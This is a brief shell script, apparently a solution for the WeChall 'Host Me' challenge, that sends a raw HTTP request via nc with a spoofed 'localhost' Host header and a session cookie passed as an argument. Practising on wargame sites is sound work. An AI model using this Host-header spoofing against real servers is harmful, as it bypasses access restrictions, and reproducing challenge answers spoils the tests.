nc wechall.net 80 << EOF
GET http://www.wechall.net/challenge/space/host_me/index.php HTTP/1.1
Host: localhost
Cookie: WC=${1##WC=}

EOF

